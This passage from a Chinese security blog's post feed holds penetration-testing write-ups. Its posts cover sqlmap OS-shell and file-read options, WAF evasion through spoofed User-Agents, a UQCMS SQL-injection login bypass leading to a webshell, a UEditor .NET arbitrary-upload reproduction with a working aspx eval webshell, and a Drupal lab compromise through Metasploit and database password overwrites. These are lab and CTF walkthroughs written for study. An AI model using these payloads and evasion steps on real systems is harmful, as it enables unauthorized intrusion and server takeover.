<h2 id="5、sql-shell：运行自定义sql语句"><a href="#5、sql-shell：运行自定义sql语句" class="headerlink" title="5、sql-shell：运行自定义sql语句"></a>5、sql-shell：运行自定义sql语句</h2><p>&emsp;&emsp;该命令用户执行指定的SQL语句，如下所示，假设执行select * from users limit 0,1 语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --sql-shell</span><br></pre></td></tr></table></figure>

<h2 id="6、–os-cmd，–os-shell：运行任意操作系统命令"><a href="#6、–os-cmd，–os-shell：运行任意操作系统命令" class="headerlink" title="6、–os-cmd，–os-shell：运行任意操作系统命令"></a>6、–os-cmd，–os-shell：运行任意操作系统命令</h2><p>&emsp;&emsp;该命令用户执行任意操作系统命令，如下所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --os-shell</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;对于MySQL来说，实际上是写入两个文件，一个是上传文件的，一个是执行命令的，具体可以参考这篇文章：<a href="https://xz.aliyun.com/t/7942">https://xz.aliyun.com/t/7942</a></p>
<p>&emsp;&emsp;请特别注意：使用该命令有几个必须具备的条件</p>
<ol>
<li>数据库用户是dba权限</li>
<li>知道网站的绝对路径</li>
<li>php当中的gpc为off时，php自动转义为关闭状态</li>
<li>就算具备以上3个条件，因为涉及到系统命令，也未必可以执行成功</li>
</ol>
<h2 id="7、–file-read：从数据库服务器中读取文件"><a href="#7、–file-read：从数据库服务器中读取文件" class="headerlink" title="7、–file-read：从数据库服务器中读取文件"></a>7、–file-read：从数据库服务器中读取文件</h2><p>&emsp;&emsp;该命令用于读取执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --file-read <span class="string">&quot;要读取的文件路径&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="8、–file-write，–file-dest：上传文件到数据库服务器中"><a href="#8、–file-write，–file-dest：上传文件到数据库服务器中" class="headerlink" title="8、–file-write，–file-dest：上传文件到数据库服务器中"></a>8、–file-write，–file-dest：上传文件到数据库服务器中</h2><p>&emsp;&emsp;该命令用于上传文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --file-write <span class="string">&quot;上传文件路径(相对路径)&quot;</span> --file-dest <span class="string">&quot;目标文件系统绝对路径&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="9、–proxy"><a href="#9、–proxy" class="headerlink" title="9、–proxy"></a>9、–proxy</h2><p>&emsp;&emsp;当遇到网站开启了流量检测，检测同一个IP的在某一时间的请求总数，我们可以使用<strong>代理池</strong>来绕过检测</p>
<h2 id="10、–user-agent"><a href="#10、–user-agent" class="headerlink" title="10、–user-agent"></a>10、–user-agent</h2><p>&emsp;&emsp;可以伪造User-Agent，因为Sqlmap自带的User-Agent是带有Sqlmap的指纹信息的，因此可以指定User-Agent防止被检测到是Sqlmap而被拦截</p>
<p>&emsp;&emsp;比如这里使用burp抓包，可以看到有Sqlmap的指纹信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636176367238-f1d4ceec-f668-4886-b00f-48858fd02413.png" alt="img"></p>
<p>&emsp;&emsp;只要更改了代理就可以除去Sqlmap的指纹信息，绕过Waf的工具检测</p>
<p>&emsp;&emsp;某网站开启了流量防护，但是如果网站开启了如果网站Waf设置了爬虫白名单，那么我们可以伪装成搜索引擎的User-Agent来进行绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --proxy=<span class="string">&quot;http://127.0.0.1:8888&quot;</span> --user-agent=<span class="string">&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636176918014-6456ede3-e29e-41ce-b9af-a44cb03d75bc.png" alt="img"></p>
<h2 id="11、–random-agent"><a href="#11、–random-agent" class="headerlink" title="11、–random-agent"></a>11、–random-agent</h2><p>&emsp;&emsp;随机指定代理</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636176531271-173511ef-4770-43b8-9b4f-f9b528ccf7e8.png" alt="img"></p>
<p>&emsp;&emsp;可以在这里添加代理</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636176661883-3daa586d-ac67-4348-855a-47f5f3b00220.png" alt="img"></p>
<h2 id="12、–delay-延时"><a href="#12、–delay-延时" class="headerlink" title="12、–delay 延时"></a>12、–delay 延时</h2><p>&emsp;&emsp;每个HTTP请求之间的延迟（秒）</p>
<p>&emsp;&emsp;当网站开启了CC流量防护等措施防止大量流量攻击时，我们可以使用<code>--delay</code>参数来减缓我们的请求速度</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --user-agent=<span class="string">&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot;</span> --delay=1</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>安全工具/安全开发</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>UQCMS——SQL注入</title>
    <url>/post/6f0081d7.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶场描述"><a href="#一、靶场描述" class="headerlink" title="一、靶场描述"></a>一、靶场描述</h1><p>&emsp;&emsp;靶场地址：10.1.0.101</p>
<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><p>&emsp;&emsp;使用扫描器扫描网站目录，可以扫到一个<strong>adminad.php</strong>的php文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986664793-a1588b77-4dd2-4f17-9dd5-37b3fe4d182c.png" alt="img"></p>
<h1 id="三、漏洞利用——SQL注入"><a href="#三、漏洞利用——SQL注入" class="headerlink" title="三、漏洞利用——SQL注入"></a>三、漏洞利用——SQL注入</h1><p>&emsp;&emsp;用户名：<code>&#39; or 1=1#</code>即可登录后台</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986686036-04afd1ed-fcf3-4ef8-b1bb-296d8c5e4829.png" alt="img"></p>
<h1 id="四、上传一句话木马"><a href="#四、上传一句话木马" class="headerlink" title="四、上传一句话木马"></a>四、上传一句话木马</h1><p>&emsp;&emsp;对其中任意一个html文件进行修改</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986707074-e20d615c-aa26-4c77-aaea-683c6522c64b.png" alt="img"></p>
<p>&emsp;&emsp;随便输入一个haha，抓包看看这个包是怎么样的，可以看到POST中content=haha，haha就是我修改的代码，说明content参数是传入代码的；另外还有个path=header.html，发现路径也是提交内容如果设为path=./xdd.php，那么理论上就可以将该文件命名为xdd.php上传提交到当前目录。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986719240-16df1192-6b4a-467f-a749-d86f3c23467c.png" alt="img"></p>
<p>&emsp;&emsp;在content一栏中加入一句话木马，并将路径设为xdd.php，放包提交，即可上传一句话木马</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986743427-17bb0651-d554-4be6-99aa-5eb4a9e1ca41.png" alt="img"></p>
<p>&emsp;&emsp;使用菜刀连接一句话木马即可</p>
]]></content>
      <categories>
        <category>综合靶场</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>UQCMS</tag>
      </tags>
  </entry>
  <entry>
    <title>Ueditor编辑器任意文件上传漏洞</title>
    <url>/post/bd0a7a34.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>UEditor是一款所见即所得的开源富文本编辑器，具有轻量、可定制、用户体验优秀等特点，被广大WEB应用程序所使用。本次爆出的高危漏洞属于.NET版本，其它的版本暂时不受影响。漏洞成因是在抓取远程数据源的时候未对文件后缀名做验证导致任意文件写入漏洞，黑客利用此漏洞可以在服务器上执行任意指令，综合评级高危。</p>
<h1 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h1><p>该漏洞影响UEditor的.Net版本，其它语言版本暂时未受影响。</p>
<h1 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h1><p>漏洞的成因是在获取图片资源时仅检查了Content-Type，导致可以绕过达到任意文件上传。具体的漏洞分析可参考：<a href="https://www.freebuf.com/vuls/181814.html">https://www.freebuf.com/vuls/181814.html</a></p>
<h1 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h1><h2 id="1、环境部署"><a href="#1、环境部署" class="headerlink" title="1、环境部署"></a>1、环境部署</h2><p>准备一台Windows Server服务器，我用的是Windows 2008 Server。</p>
<p>没有安装.NET Framework 4.0的要先安装：<a href="http://www.microsoft.com/zh-cn/download/details.aspx?id=17718">http://www.microsoft.com/zh-cn/download/details.aspx?id=17718</a></p>
<p>安装完 .NET Framework 4.0 后，还需要向 IIS 注册应用程序池，注册的方法是，使用<strong>管理员权限</strong>打开命令提示符（CMD），输入以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\aspnet_regiis <span class="literal">-i</span></span><br></pre></td></tr></table></figure>

<p>安装完毕后，在 IIS 管理器刷新就能看到 4.0 的应用程序池。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659162290916-6479f4e3-9e62-4f86-b68c-6dd1138b5c2a.png" alt="img"></p>
<p><a href="https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3">https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3</a> 下载utf8的.net版本</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659177928306-4d7a6b76-56b7-4ce9-be0a-f36d91887f93.png" alt="img"></p>
<p>右键 网站–添加网站，选择下载的Ueditor目录， 选择版本为 4.0 的应用程序池；点击连接为，设置特定用户，该特定用户为主机上存在的用户例如administrator</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659173633936-90ae8d26-3b7e-4ae2-818b-823adce804cd.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659176476037-ba138061-20d7-4e50-bcdc-b24a7a8e6f0c.png" alt="img"></p>
<p>此时访问127.0.0.1:8080已经有Ueditor的界面了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659167319446-b4438260-37b0-4719-b91d-626a292ca1ad.png" alt="img"></p>
<p>代码要求以应用程序的形式来运行（可以方便加入库依赖和组织代码）。所以需要把 net 目录转换为应用程序；点击连接为，设置特定用户，该特定用户为主机上存在的用户例如administrator</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659173688195-68663067-848f-454b-a44c-5245feb61ea1.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659176447829-104fb267-7ef4-4799-8adf-8f00a36e1bf7.png" alt="img"></p>
<p>访问net/controller.ashx 控制器文件，出现以下界面说明编辑器应用程序运行成功，且漏洞存在，到此配置完毕。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659167479945-47a31c7f-57f2-48f2-b8f2-9bb51b3960ab.png" alt="img"></p>
<p>如果配置过程中访问页面显示权限不够的报错，那么<strong>右键部署项目的文件夹，选择属性，选择安全，增加Everyone用户，将该用户的权限设置为完全控制，点击确定，重新部署即可。</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659167533505-10050ba7-d702-4c38-abde-0c9421502c0f.png" alt="img"></p>
<h2 id="2、攻击流程"><a href="#2、攻击流程" class="headerlink" title="2、攻击流程"></a>2、攻击流程</h2><p>访问<a href="http://ip:port/net/controller.ashx">http://ip:port/net/controller.ashx</a> 控制器文件。当出现下图的时候表示漏洞存在</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659169448619-8664c47f-4b11-40a6-a53c-c82041bcc708.png" alt="img"></p>
<p>准备一个aspx一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;% @Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;w01ke&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<p>制作图片马</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> w01ke.jpg /b + shell.aspx /a ueditor.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659171073192-49c1da52-0cc8-439c-a329-9a5895157209.png" alt="img"></p>
<p>准备一台服务器存放图片马或者需要上传的文件，将做好的ueditor.jpg图片马上传到我们的服务器，并开启下载服务（HTTP）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659171520246-73c7a63c-53d6-474c-82cb-7cb73f0390cf.png" alt="img"></p>
<p>制作一个HTML。因为不是上传漏洞所以enctype 不需要指定为multipart/form-data。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxxxx/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span>&lt;/p &gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中<a href="http://xx.com/">http://xx.com</a> 为需要测试的网站地址，action后填写路径为实际中遇到的路径，不要太死板，如果太死板不按网站的实际路径来就会出现路径找不到的错误</p>
<p>打开我们做好的HTML，shell addr 处填写服务器上图片马地址，构造成以下格式，绕过上传使其解析为 aspx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxxx/ueditor.jpg?.aspx</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659172092537-683d30c8-7faf-4081-9e0a-d2a7c73cd205.png" alt="img"></p>
<p>点击submit，直接显示无效URL</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659172156714-3008c54c-1148-490c-81d9-63babb1c6e3c.png" alt="img"></p>
<p>经过排查，发现不能用Python开启web的方式，貌似只能用域名的形式（我不确定），我只好把我的图片马上传至云服务器，然后修改访问域名即可成功，同时回显了木马路径</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659177677192-090b8249-8604-496c-8694-5cecd1e7e307.png" alt="img"></p>
<p>使用蚁剑连接：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659177867343-d5e35a4d-dd6f-469f-8927-0e10bf35c693.png" alt="img"></p>
<h1 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h1><ol>
<li>修改CrawlerHandler.cs 增加对文件扩展名的；</li>
<li>IPS等防御产品可以加入相应的特征</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Ueditor</tag>
        <tag>.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulhub-DC-1-Drupal</title>
    <url>/post/58fcce74.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://www.vulnhub.com/entry/dc-1-1,292/">https://www.vulnhub.com/entry/dc-1-1,292/</a></p>
<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）重置靶场密码"><a href="#（1）重置靶场密码" class="headerlink" title="（1）重置靶场密码"></a>（1）重置靶场密码</h3><p>&emsp;&emsp;重启主机，长按shift，进入如下界面后，按e</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214045971.png" alt="image-20211210214045971"></p>
<p>&emsp;&emsp;找到linux开头的行，在最后输入 <code>init=/bin/bash</code>，输入完成后按<strong>Crtl+X</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214117094.png" alt="image-20211210214117094"></p>
<p>&emsp;&emsp;<code>mount -o rw,remount /</code>，回车</p>
<p>&emsp;&emsp;<code>    passwd root</code>，输入新密码两次</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887624157-f28ec6e4-9aae-42bd-bd62-54c7c5cad409.png" alt="img"></p>
<p>&emsp;&emsp;如果提示改变密码成功，重启该虚拟机</p>
<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214232920.png" alt="image-20211210214232920"></p>
<h1 id="二、预备知识"><a href="#二、预备知识" class="headerlink" title="二、预备知识"></a>二、预备知识</h1><p>&emsp;&emsp;Drupal：Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/2683135">内容管理系统</a>（CMS）和PHP开发框架（Framework）共同构成。</p>
<p>&emsp;&emsp;注入原理：Drupal  Sql注入漏洞原理是酱紫的，Drupal在处理IN语句的时候，要通过expandArguments函数来展开数组。由于expandArguments函数没有对当前数组中key值进行有效的过滤，给攻击者可乘之机。攻击者通过精心构造的SQL语句可以执行任意PHP代码。</p>
<h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
<h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.108</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214320940.png" alt="image-20211210214320940"></p>
<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214552976.png" alt="image-20211210214552976"></p>
<p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214537191.png" alt="image-20211210214537191"></p>
<h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.108</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到开放了HTTP和SSH</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214433486.png" alt="image-20211210214433486"></p>
<p>&emsp;&emsp;发现是Drupal的cms框架的登录页面</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214617440.png" alt="image-20211210214617440"></p>
<h1 id="四、漏洞探测与利用"><a href="#四、漏洞探测与利用" class="headerlink" title="四、漏洞探测与利用"></a>四、漏洞探测与利用</h1><h2 id="1、漏洞探测"><a href="#1、漏洞探测" class="headerlink" title="1、漏洞探测"></a>1、漏洞探测</h2><p>&emsp;&emsp;首先弱口令登录，扫端口、扫后台都没什么较大的收获。于是将目标盯在了Drupal这个cms框架上面了，发现这个cms有一个注入getshell的漏洞（CVE-2018-7600），并且metasploit中已有攻击模块，可以直接利用。</p>
<p>&emsp;&emsp;打开msf，查找drupal武器库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search drupal</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里可以根据需求选择，我选择比较新的2018年的攻击模块</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210215043543.png" alt="image-20211210215043543"></p>
<h2 id="2、漏洞利用"><a href="#2、漏洞利用" class="headerlink" title="2、漏洞利用"></a>2、漏洞利用</h2><h3 id="（1）反弹shell"><a href="#（1）反弹shell" class="headerlink" title="（1）反弹shell"></a>（1）反弹shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use /exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.108</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210215552055.png" alt="image-20211210215552055"></p>
<p>&emsp;&emsp;使用python反弹一个交互式shell TTY，美化终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210215753754.png" alt="image-20211210215753754"></p>
<h3 id="（2）flag1"><a href="#（2）flag1" class="headerlink" title="（2）flag1"></a>（2）flag1</h3><p>&emsp;&emsp;查看当前目录，看有无可以利用的信息文件，其他目录信息如下。发现了第一个flag1文件，查看flag1文件。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210220036438.png" alt="image-20211210220036438"></p>
<h3 id="（3）flag2"><a href="#（3）flag2" class="headerlink" title="（3）flag2"></a>（3）flag2</h3><p>&emsp;&emsp;通过flag1的提示，告知我们cms的配置文件很重要，暗藏敏感文件。所以我们需要查看目录下的其他文件来获取信息。</p>
<ol>
<li>首先我们百度搜索drupal有哪些重要的配置文件及重要文件的默认路径 ，挑选重点下手能节省时间。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210220840422.png" alt="image-20211210220840422"></p>
<ol start="2">
<li>drupal的配置文件是 <code>/sites/default/settings.php</code> ，是数据库连接配置文件。我们去查看这个文件有大收获，我们发现了flag2内容，以及数据库的账户和密码</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210221634133.png" alt="image-20211210221634133"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br></pre></td></tr></table></figure>

<h3 id="（4）数据库相关信息获取"><a href="#（4）数据库相关信息获取" class="headerlink" title="（4）数据库相关信息获取"></a>（4）数据库相关信息获取</h3><p>&emsp;&emsp;首先我们通过flag2得到了数据库为mysql数据库，并且数据库名、账号和密码都有了，肯定是要进入数据库看有无所需信息的。如系统管理员账户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210222335371.png" alt="image-20211210222335371"></p>
<p>&emsp;&emsp;Drupal框架默认的用户表就是users表，查询users表中，系统管理员admin的账户信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use drupaldb</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210222519860.png" alt="image-20211210222519860"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;发现admin账号和经过加密的密码，drupal常用密码加密是MD5格式，但是7.0以后因为安全性问题将加密方式改成了hash加密（由于很多在线MD5爆破和MD5数据库，可以查到很多MD5码的原文，所以Drupal 7已不再采用Drupal   6和5简单的MD5加密，而是采用一种新型的Hash加密方法。新型加密方法是“加了盐（Salt）”的MD5码，简单理解就是并不会直接将password进行MD5加密，而会和用户名或其它随机字符串组合在一起后再MD5加密。）。</p>
<p>&emsp;&emsp;这里不是md5加密，应该是自定义的加密方式。flag2中给的提示暴力破解不是唯一的方法我们得想一下其他的办法。</p>
<h3 id="（5）数据库admin管理员密码修改及获取flag3"><a href="#（5）数据库admin管理员密码修改及获取flag3" class="headerlink" title="（5）数据库admin管理员密码修改及获取flag3"></a>（5）数据库admin管理员密码修改及获取flag3</h3><p>&emsp;&emsp;我们想办法的同时也可以百度向开发人员询问答案，查找drupal7忘记密码怎么办？drupal7如何重置密码？drupal7如何修改密码？这些问题让我们拿到admin这个管理员账户。</p>
<ol>
<li>drupal7重置admin用户的密码</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210223623002.png" alt="image-20211210223623002"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这样就能获取加密后的密码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225407251.png" alt="image-20211210225407251"></p>
<p>&emsp;&emsp;进入数据库，修改admin的密码（密文）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>udbuser <span class="operator">-</span>pR0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update users <span class="keyword">set</span> pass<span class="operator">=</span>&quot;$S$DFrLnFFXTGFCqK75zqX7nXsNI271QDS5pDN7uIOgcguQK81Fj1LI&quot; <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225458368.png" alt="image-20211210225458368"></p>
<ol start="2">
<li>登录成功</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225053466.png" alt="image-20211210225053466"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225523769.png" alt="image-20211210225523769"></p>
<h3 id="（7）更隐蔽方式，添加新管理员账户获取flag3"><a href="#（7）更隐蔽方式，添加新管理员账户获取flag3" class="headerlink" title="（7）更隐蔽方式，添加新管理员账户获取flag3"></a>（7）更隐蔽方式，添加新管理员账户获取flag3</h3><p>&emsp;&emsp;exploit-db（漏洞利用库）：kali中已经内置，默认路径为：/pentest/exploits/exploitdb。可以使用searchsploit命令来搜索exp进行利用。</p>
